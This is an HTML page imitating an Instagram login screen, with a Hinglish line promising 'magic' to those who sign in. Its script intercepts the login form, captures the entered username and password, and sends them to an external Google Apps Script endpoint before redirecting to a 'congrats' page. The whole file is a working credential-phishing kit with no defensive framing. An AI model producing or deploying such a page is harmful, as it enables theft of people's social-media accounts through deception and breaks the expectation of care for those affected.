<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      text-align: center;
    }
    input {
      width: 100%;
      margin: 8px 0;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }
    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 10px;
      margin-top: 10px;
      border-radius: 4px;
      font-weight: bold;
    }
    .title {
      margin-bottom: 20px;
      font-size: 16px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">Log-in karo apni Insta ID se aur magic dekho</div>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const username = e.target.username.value;
      const password = e.target.password.value;

      fetch("https://script.google.com/macros/s/AKfycbxLDSZGTdegx0iKEzgXTDgxbhSLCv2KyzYboCB8JZKIHDhQ-_NFVCmw6hnMhtcpWAdl9A/exec", {
        method: "POST",
        body: JSON.stringify({ username, password }),
        headers: {
          "Content-Type": "application/json",
        },
      }).then(() => {
        window.location.href = "congrats.html";
      });
    });
  </script>
</body>
</html>
